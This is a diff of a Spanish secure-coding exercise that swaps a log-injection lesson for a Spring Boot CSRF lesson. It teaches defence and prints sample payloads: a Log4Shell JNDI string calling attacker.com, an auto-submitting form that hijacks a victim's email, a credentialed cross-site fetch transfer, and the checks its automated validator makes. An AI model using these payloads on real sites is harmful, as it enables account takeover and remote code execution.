@@ -1,214 +1,189 @@
-# Paso 9 — Log Injection
-**Tecnologia:** Java / Spring Boot | **OWASP:** A09:2021 - Security Logging and Monitoring Failures | **CWE-117**
+# Paso 10 — Cross-Site Request Forgery (CSRF)
+**Tecnologia:** Java / Spring Boot | **OWASP:** A01:2021 - Broken Access Control | **CWE-352**
 
 ---
 
 ## Que es esta vulnerabilidad?
 
-Log Injection ocurre cuando una aplicacion escribe input del usuario directamente en logs sin sanitizar los caracteres de control. Un atacante puede inyectar saltos de linea (`\n`, `\r`) para insertar lineas falsas en el registro, haciendo que parezca que han ocurrido eventos legitimos que nunca sucedieron, o que han ocultado eventos reales.
+CSRF (Cross-Site Request Forgery) es un ataque donde un sitio malicioso fuerza al navegador de la victima a ejecutar peticiones autenticadas contra una aplicacion en la que el usuario ya tiene sesion activa. El servidor no puede distinguir una peticion legitima del usuario de una forzada por el atacante, porque ambas llegan con las mismas cookies de sesion.
 
-Los logs son la fuente principal de evidencia forense y deteccion de ataques. Si un atacante puede falsificarlos, puede:
-- Ocultar su actividad maliciosa insertando "ruido" que diluya las alertas reales
-- Falsificar eventos de login exitoso para confundir analistas
-- Inyectar lineas que activen reglas SIEM incorrectas (falsos positivos)
-- En sistemas con log parsers inseguros, explotar JNDI Injection via Log4Shell (CVE-2021-44228)
+El mecanismo de ataque es el siguiente: el navegador incluye automaticamente las cookies del dominio destino en cualquier peticion hacia ese dominio, independientemente del origen de la pagina que inicia la peticion. Si un sitio en `evil.com` hace un formulario con `action="https://banco.com/transferencia"`, el navegador enviara las cookies del usuario en `banco.com`.
+
+CSRF afecta principalmente a aplicaciones que usan cookies para autenticacion (en oposicion a tokens Bearer en el header `Authorization`). Es especialmente grave en acciones de alto impacto: cambio de email, cambio de contrasena, transferencias bancarias, borrado de datos.
 
 ---
 
 ## Donde ocurre en este codigo?
 
-**Archivo:** `src/java/src/main/java/com/example/api/controller/AuthController.java`
+**Archivo:** `src/java/src/main/java/com/example/api/controller/SecurityConfig.java`
 
 ```java
 // CODIGO VULNERABLE — estado actual del ejercicio
-@PostMapping("/login")
-public ResponseEntity<?> login(@RequestParam String username,
-                               @RequestParam String password) {
-    log.info("Login attempt for user: " + username);  // username sin sanitizar
-    return ResponseEntity.ok(Map.of("message", "OK"));
+@Bean
+public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+    http.csrf(csrf -> csrf.disable())  // proteccion CSRF completamente deshabilitada
+        .authorizeHttpRequests(auth -> auth.anyRequest().authenticated());
+    return http.build();
 }
 ```
 
-El problema esta en la concatenacion `"Login attempt for user: " + username`. Si `username` contiene `\n`, el logger escribe dos lineas separadas. El atacante controla el contenido completo de la segunda linea.
-
-En SLF4J/Logback, el log resultante en disco seria literalmente:
-```
-2026-05-20 INFO Login attempt for user: admin
-INFO Login successful for user: admin  <- linea falsa inyectada
-```
+Con `csrf.disable()`, Spring Security no requiere ni verifica tokens CSRF en ningun endpoint. Cualquier peticion con metodos POST, PUT, DELETE sera aceptada si llega con una cookie de sesion valida, sin importar el origen.
 
 ---
 
 ## Como lo explotaria un atacante
 
-**Inyeccion de evento falso de login exitoso:**
-```
-POST /api/auth/login
-username=alice%0AINFO+Login+successful+for+user:+alice
-password=wrongpassword
+**Escenario:** el usuario esta autenticado en `app.empresa.com`. El atacante crea esta pagina en `evil.com`:
+
+```html
+<!-- evil.com/csrf-attack.html -->
+<html>
+<body>
+  <!-- Formulario invisible que se envia automaticamente al cargar la pagina -->
+  <form id="attack" action="https://app.empresa.com/api/user/email" method="POST">
+    <input type="hidden" name="newEmail" value="attacker@evil.com">
+  </form>
+  <script>document.getElementById('attack').submit();</script>
+</body>
+</html>
 ```
 
-El log mostrara:
-```
-INFO Login attempt for user: alice
-INFO Login successful for user: alice
-```
+Cuando la victima visita `evil.com/csrf-attack.html`, su navegador envia automaticamente la peticion POST a `app.empresa.com` con las cookies de sesion activas. El email del usuario queda cambiado al del atacante, que puede entonces hacer un reset de contrasena y tomar la cuenta.
 
-Un analista revisando el log asumira que el login fue exitoso cuando en realidad fallo.
-
-**Inyeccion de lineas para activar alertas falsas:**
+**Ataque via img tag (peticiones GET):**
+```html
+<img src="https://app.empresa.com/api/user/delete-account">
 ```
-username=admin%0ACRITICAL+SQL+INJECTION+DETECTED+from+192.168.1.100
-```
-
-Genera una alerta critica falsa que distrae al equipo de seguridad (cortina de humo).
-
-**Log4Shell (CVE-2021-44228) — la forma mas grave de log injection:**
-```
-username=${jndi:ldap://attacker.com/exploit}
-```
-
-Log4j 2 evaluaba expresiones JNDI dentro de los mensajes de log. Al loguear este input, el servidor hacia una conexion LDAP al servidor del atacante y ejecutaba el codigo descargado. Afecto a millones de servidores en 2021.
 
 ---
 
 ## Tu tarea: aplicar la mitigacion
 
-Modifica `AuthController.java` para sanitizar el username antes de escribirlo en logs:
+Modifica `SecurityConfig.java` para habilitar CSRF con `CookieCsrfTokenRepository`:
 
 ```java
 // CODIGO SEGURO
-private static String sanitizeForLog(String input) {
-    if (input == null) return "null";
-    // Eliminar caracteres de control (saltos de linea, tabuladores, etc.)
-    String sanitized = input.replaceAll("[\\r\\n\\t]", "_");
-    // Limitar longitud para evitar logs anormalmente largos
-    if (sanitized.length() > 100) {
-        sanitized = sanitized.substring(0, 100) + "[truncado]";
-    }
-    return sanitized;
-}
+import org.springframework.security.web.csrf.CookieCsrfTokenRepository;
 
-@PostMapping("/login")
-public ResponseEntity<?> login(@RequestParam String username,
-                               @RequestParam String password) {
-    // Usar logging parametrizado Y sanitizacion del input
-    log.info("Login attempt for user: {}", sanitizeForLog(username));
-    return ResponseEntity.ok(Map.of("message", "OK"));
+@Configuration
+@EnableWebSecurity
+public class SecurityConfig {
+
+    @Bean
+    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+        http
+            // CSRF habilitado con token en cookie accesible al frontend del mismo origen
+            .csrf(csrf -> csrf
+                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
+            )
+            .authorizeHttpRequests(auth -> auth
+                .requestMatchers("/api/public/**").permitAll()
+                .anyRequest().authenticated()
+            );
+        return http.build();
+    }
 }
 ```
 
 ### Por que funciona esta mitigacion?
 
-- **Eliminar `\r`, `\n`, `\t`:** estos caracteres son los que permiten dividir lineas en el log. Sin ellos, el input del usuario no puede crear nuevas entradas en el registro.
-- **Logging parametrizado (`{}`):** SLF4J con `{}` trata el argumento como dato opaco, no como patron de formato. Previene ataques de formato de string (aunque en Java/SLF4J el riesgo es menor que en C). Mejora tambien el rendimiento al no construir el string si el nivel de log no esta activo.
-- **Limite de longitud:** un input de 100MB en un log generaria un archivo enorme. Truncar a 100 caracteres previene el DoS por disco lleno via logs.
+- **`CookieCsrfTokenRepository`:** Spring escribe el token CSRF en una cookie `XSRF-TOKEN`. El frontend JavaScript del mismo origen puede leerla y enviarla en el header `X-XSRF-TOKEN` con cada peticion.
+- **`withHttpOnlyFalse()`:** permite que JavaScript lea la cookie `XSRF-TOKEN`. Sin esto, el frontend no podria leer el token para incluirlo en las peticiones. La cookie de sesion principal sigue siendo `HttpOnly`.
+- **Proteccion Double Submit Cookie:** el servidor verifica que el valor en el header `X-XSRF-TOKEN` coincida con el token de la sesion. Un atacante en `evil.com` no puede leer la cookie `XSRF-TOKEN` del usuario (bloqueado por Same-Origin Policy) y por tanto no puede incluir el header correcto.
 
 ---
 
-## Variantes de la misma categoria (Logging Failures — mas complejas)
+## Variantes de la misma categoria (CSRF / Broken Access Control — mas complejas)
 
-### Variante A: Log4Shell — JNDI Injection via Log4j (CVE-2021-44228)
+### Variante A: CSRF con Content-Type JSON (SameSite bypass)
 
-Esta es la variante mas catastrofica de log injection. Log4j 2 incluia un mecanismo de "lookup" que evaluaba expresiones `${...}` dentro de mensajes de log:
+Algunas APIs solo aceptan peticiones `Content-Type: application/json`, asumiendo que el navegador no puede enviar ese tipo desde un formulario externo. Esto es incorrecto en contextos modernos:
 
-```java
-// VULNERABLE — Log4j 2 < 2.15.0 (practicamente cualquier Java app en 2021)
-// No hay codigo incorrecto del desarrollador: Log4j lo hace internamente
-logger.info("User agent: {}", request.getHeader("User-Agent"));
-// Si User-Agent = ${jndi:ldap://attacker.com/x}, Log4j hace una conexion LDAP
-// y ejecuta la clase Java descargada -> RCE
+```javascript
+// VULNERABLE — asumir que JSON content-type previene CSRF
+// El servidor acepta la peticion si el Content-Type es application/json
+// Un atacante puede enviarla via fetch desde evil.com:
+fetch('https://app.empresa.com/api/transfer', {
+    method: 'POST',
+    credentials: 'include',   // envia cookies
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ amount: 9999, to: 'attacker' })
+});
+// El preflight CORS puede fallar, pero con una CORS misconfiguration, pasa.
 ```
 
 ```java
-// MITIGACION — actualizar Log4j a >= 2.17.1 y deshabilitar lookups
-// En log4j2.xml:
-// <Configuration>
-//   <Properties>
-//     <Property name="log4j2.formatMsgNoLookups">true</Property>
-//   </Properties>
-// </Configuration>
-// O con JVM flag: -Dlog4j2.formatMsgNoLookups=true
+// SEGURO — combinar CSRF token + verificacion de Origin header
+// Verificar que Origin o Referer corresponde al dominio propio
+@Component
+public class OriginVerificationFilter extends OncePerRequestFilter {
+    @Override
+    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res, FilterChain chain)
+            throws ServletException, IOException {
+        String origin = req.getHeader("Origin");
+        if (origin != null && !origin.equals("https://app.empresa.com")) {
+            res.sendError(HttpServletResponse.SC_FORBIDDEN);
+            return;
+        }
+        chain.doFilter(req, res);
+    }
+}
 ```
 
 ---
 
-### Variante B: Datos sensibles en logs (contratasenas, tokens)
+### Variante B: Login CSRF (forzar sesion del atacante en el navegador de la victima)
 
 ```java
-// VULNERABLE — loguear el cuerpo completo de la peticion
+// VULNERABLE — endpoint de login sin proteccion CSRF
+// Un atacante puede forzar al navegador de la victima a iniciar sesion
+// con las credenciales del atacante
 @PostMapping("/login")
-public ResponseEntity<?> login(@RequestBody LoginRequest req) {
-    log.info("Login request: {}", req.toString());  // incluye la contrasena en texto plano
-    // ...
+public ResponseEntity<?> login(@RequestParam String username, @RequestParam String password) {
+    // autenticar y crear sesion
 }
 ```
 
-Si `LoginRequest.toString()` incluye todos los campos (comportamiento por defecto de Lombok `@ToString`), la contrasena queda en texto plano en los logs.
+Payload: la victima visita `evil.com` que tiene un formulario que hace submit automatico a `/login` con credenciales del atacante. La victima queda logada como el atacante sin saberlo. Todo lo que la victima hace (subir documentos, realizar compras) queda en la cuenta del atacante.
 
 ```java
-// SEGURO — excluir campos sensibles del toString y loguear solo lo necesario
-@ToString(exclude = {"password", "token", "creditCard"})
-public class LoginRequest {
-    private String username;
-    private String password;  // excluido del toString por @ToString(exclude)
-}
-
-@PostMapping("/login")
-public ResponseEntity<?> login(@RequestBody LoginRequest req) {
-    log.info("Login attempt for user: {}", sanitizeForLog(req.getUsername()));
-    // La contrasena nunca aparece en logs
-}
+// SEGURO — CSRF token tambien en el formulario de login (aunque el usuario no este autenticado)
+// Spring Security aplica CSRF por defecto a todos los metodos POST, incluyendo /login
+// Solo debe deshabilitarse si se usa autenticacion stateless con JWT en header
 ```
 
 ---
 
-### Variante C: Log Injection en logging estructurado (JSON logs)
+### Variante C: CSRF bypass via SameSite=None en cookies de terceros
 
-En sistemas modernos que usan JSON para logs estructurados, un atacante puede inyectar campos JSON adicionales:
-
-```python
-# VULNERABLE — input del usuario interpolado en JSON de log
-import logging, json
-
-logger = logging.getLogger()
-
-@router.post("/login")
-async def login(username: str):
-    # Si username = '", "isAdmin": true, "x": "', el JSON del log queda malformado
-    # o inyecta el campo isAdmin en el evento de log
-    log_entry = f'{{"event": "login", "user": "{username}"}}'
-    logger.info(log_entry)
+```
+# VULNERABLE — configurar cookies de sesion con SameSite=None sin Secure
+Set-Cookie: JSESSIONID=abc123; SameSite=None
 ```
 
-Payload: `username=x", "isAdmin": true, "user": "x`
+`SameSite=None` permite que la cookie se envie en peticiones cross-site. Sin `Secure`, ademas viaja por HTTP.
 
-```python
-# SEGURO — usar logging estructurado con serializacion correcta
-import structlog
-
-log = structlog.get_logger()
-
-@router.post("/login")
-async def login(username: str):
-    safe_user = sanitize_for_log(username)
-    log.info("login_attempt", user=safe_user)  # structlog serializa correctamente
 ```
+# SEGURO — usar SameSite=Strict o SameSite=Lax con el token CSRF como defensa en profundidad
+Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Strict
+```
+
+Con `SameSite=Strict`, el navegador no envia la cookie en peticiones cross-site, eliminando CSRF sin necesidad de token. Sin embargo, CSRF token sigue siendo recomendado como defensa en profundidad ante bugs de implementacion `SameSite`.
 
 ---
 
 ## Referencias
 
-- [OWASP A09:2021 - Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/)
-- [CWE-117: Improper Output Neutralization for Logs](https://cwe.mitre.org/data/definitions/117.html)
-- [CVE-2021-44228 - Log4Shell](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)
-- [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
+- [OWASP A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
+- [CWE-352: CSRF](https://cwe.mitre.org/data/definitions/352.html)
+- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
+- [Spring Security - CSRF](https://docs.spring.io/spring-security/reference/features/exploits/csrf.html)
 
 ---
 
 ## Lo que valida el workflow automaticamente
 
-El workflow **Validate Step 09** exige que `AuthController.java` contenga:
-- `sanitizeForLog`
-- `replaceAll`
-- La desaparicion del log vulnerable por concatenacion
+El workflow **Validate Step 10** exige que `SecurityConfig.java` contenga:
+- `CookieCsrfTokenRepository`
+- `EnableWebSecurity`
+- La ausencia de `csrf.disable()`
